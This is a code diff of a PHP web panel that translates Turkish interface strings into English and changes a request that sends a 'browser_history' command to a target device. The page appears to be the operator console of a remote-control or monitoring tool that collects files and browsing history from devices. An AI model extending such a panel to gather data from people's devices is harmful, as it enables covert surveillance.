@@ -19,7 +19,7 @@ foreach ($filelist as $file){
                 <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
 
                 <div class="col-md-10 col-lg-offset-0">
-                        <label for="select" class="col-lg-2 control-label">Kayıtlı Dosyalar</label>
+                        <label for="select" class="col-lg-2 control-label">Existing Files</label>
                         <div class="col-lg-4">
                             <select class="form-control" id="selected-file" name="selected-file">
                                 <?php
@@ -30,7 +30,7 @@ foreach ($filelist as $file){
                             </select>
                         </div>
 
-                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Dosyayı Göster</button>
+                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Show File</button>
 
                 </div>
 
@@ -73,7 +73,7 @@ foreach ($filelist as $file){
             console.log(err);
             if (data){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
@@ -93,7 +93,7 @@ foreach ($filelist as $file){
 
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
@@ -104,16 +104,16 @@ foreach ($filelist as $file){
     });
 
     $("#command-sender-id").click(function() {
-        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "browser_history", value: true}, function( data, err ) {
+        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", command: "browser_history"}, function( data, err ) {
             if (data.status){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
